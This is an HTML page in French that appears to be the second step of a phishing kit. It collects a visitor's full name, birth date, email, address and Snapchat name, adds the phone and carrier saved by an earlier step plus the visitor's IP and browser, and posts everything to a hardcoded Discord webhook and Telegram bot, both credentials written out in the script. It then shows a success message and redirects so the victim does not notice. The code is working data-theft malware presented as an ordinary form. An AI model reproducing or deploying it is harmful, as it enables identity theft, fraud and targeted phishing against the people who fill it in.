<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulaire</title>
  <style>
    body {
      background: #2c014d;
      color: #ffffff;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 15px;
      box-sizing: border-box;
    }

    .c {
      background: rgba(44, 1, 77, 0.88);
      padding: 32px 28px;
      border-radius: 20px;
      width: 100%;
      max-width: 380px;
      text-align: center;
      box-shadow: 0 0 25px rgba(155, 0, 255, 0.6);
      border: 2px solid #a54ffb;
      backdrop-filter: blur(4px);
    }

    h1 {
      margin: 0 0 28px;
      font-size: 1.65rem;
      color: #f7b500;
      text-shadow: 0 0 12px #f7b500;
    }

    label {
      display: block;
      text-align: left;
      margin: 14px 0 6px;
      font-size: 0.92rem;
      color: #d4bbff;
    }

    input,
    button {
      width: 100%;
      margin: 8px 0;
      padding: 13px 16px;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background: rgba(255, 255, 255, 0.04);
      color: white;
      font-size: 16px;
      outline: none;
      transition: all 0.3s ease;
      box-shadow: inset 0 0 10px rgba(155, 0, 255, 0.25);
    }

    input:focus {
      border-color: #f7b500;
      box-shadow: 0 0 14px #f7b50088;
      background: rgba(255, 255, 255, 0.08);
    }

    button {
      background: #f7b500;
      color: #2c014d;
      font-weight: bold;
      cursor: pointer;
      border: none;
      box-shadow: 0 0 15px #f7b500aa;
      margin-top: 18px;
      font-size: 1.1rem;
    }

    button:hover {
      background: #ffcb3c;
      box-shadow: 0 0 28px #ffcb3c;
      transform: translateY(-2px);
    }

    #msg {
      margin-top: 18px;
      font-size: 0.95rem;
      min-height: 1.4em;
    }

    .success { color: #aaffaa; }
    .error   { color: #ff8888; }
  </style>
</head>
<body>

  <div class="c">
    <h1>Ã‰tape 2 : Vos infos</h1>

    <form id="form2">
      <input name="nom"     placeholder="Nom"              required />
      <input name="prenom"  placeholder="PrÃ©nom"           required />
      
      <label for="naissance">Date de naissance :</label>
      <input id="naissance" name="naissance" type="date"   required />
      
      <input name="email"    type="email" placeholder="Email"          required />
      <input name="ville"    placeholder="Ville"                       required />
      <input name="codePostal" placeholder="Code Postal"             required />
      <input name="adresse"  placeholder="Adresse (facultatif)"        />
      <input name="snap"     placeholder="Nom Snapchat"                required />

      <button type="submit">Valider</button>
    </form>

    <div id="msg"></div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL    = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
    const DISCORD_ALT_WEBHOOK_URL = DISCORD_WEBHOOK_URL; // mÃªme URL dans ton cas
    const TELEGRAM_TOKEN = "8376532446:AAEJHOCBBO8KrHJb2pnrsu2e1-Ow17pl9r0";
    const TELEGRAM_CHAT_ID = "8431463416";

    async function sendDiscord(embed, url) {
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ embeds: [embed] })
        });
        return res.ok;
      } catch {
        return false;
      }
    }

    async function sendTelegram(text) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: "Markdown",
            disable_web_page_preview: true
          })
        });
        return res.ok;
      } catch {
        return false;
      }
    }

    async function getApifyInfo() {
      try {
        const res = await fetch('https://api.apify.com/v2/browser-info?format=json');
        if (!res.ok) throw new Error();
        const data = await res.json();
        return {
          ip: data.ip || "Inconnu",
          ua: data.userAgent || navigator.userAgent
        };
      } catch {
        return {
          ip: "Inconnu",
          ua: navigator.userAgent
        };
      }
    }

    document.getElementById("form2").addEventListener("submit", async (e) => {
      e.preventDefault();
      const msg = document.getElementById("msg");
      msg.textContent = "Envoi en cours...";
      msg.className = "";

      const formData = new FormData(e.target);
      const step2 = Object.fromEntries(formData);

      const step1Raw = localStorage.getItem("step1") || "{}";
      const step1 = JSON.parse(step1Raw);
      const operateur = step1.operateur || "Non fourni";
      const telephone = step1.telephone || "Non fourni";

      const apify = await getApifyInfo();
      const ip = apify.ip;
      const ua  = apify.ua;

      let webhook = DISCORD_WEBHOOK_URL;
      if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
        webhook = DISCORD_ALT_WEBHOOK_URL;
      }

      const txt = 
`ðŸ“˜ **+1 NEW ENTRY : ${step2.snap || "â€”"}** ðŸ“˜

**Informations personnelles**
â”œ ðŸ‘¤ **Nom complet** : ${step2.nom} ${step2.prenom}
â”œ ðŸ  **Adresse** : ${step2.adresse || "â€”"}
â”œ ðŸ“ **Ville** : ${step2.ville}
â”œ ðŸ“® **Code postal** : ${step2.codePostal}
â”” ðŸ“± **TÃ©lÃ©phone** : ${telephone}

**Contact**
â”œ âœ‰ï¸ **Email** : ${step2.email}
â”œ ðŸ‘» **Snapchat** : ${step2.snap || "â€”"}
â”” ðŸ“¡ **OpÃ©rateur** : ${operateur}

**Connexion**
â”œ ðŸ§­ **IP** : ${ip}
â”” ðŸ’» **Navigateur** : ${ua}`;

      const embed = {
        title: `ðŸ“˜ +1 NEW ENTRY : ${step2.snap || "â€”"} ðŸ“˜`,
        color: 0x9b00ff,
        description: txt,
        timestamp: new Date().toISOString(),
        footer: { text: "ðŸ‡ªðŸ‡¸ rez by zelephuhq ðŸ‡ªðŸ‡¸" }
      };

      try {
        const [discordOk, telegramOk] = await Promise.all([
          sendDiscord(embed, webhook),
          sendTelegram(txt)
        ]);

        if (discordOk || telegramOk) {
          msg.textContent = "DonnÃ©es envoyÃ©es avec succÃ¨s ! Redirection...";
          msg.className = "success";
          localStorage.setItem("step2", JSON.stringify(step2));
          setTimeout(() => {
            window.location.href = "merci.html";
          }, 1400);
        } else {
          throw new Error("Ã©chec total");
        }
      } catch (err) {
        msg.textContent = "Erreur lors de l'envoi. RÃ©essaie ?";
        msg.className = "error";
        console.error(err);
      }
    });
  </script>
</body>
</html>
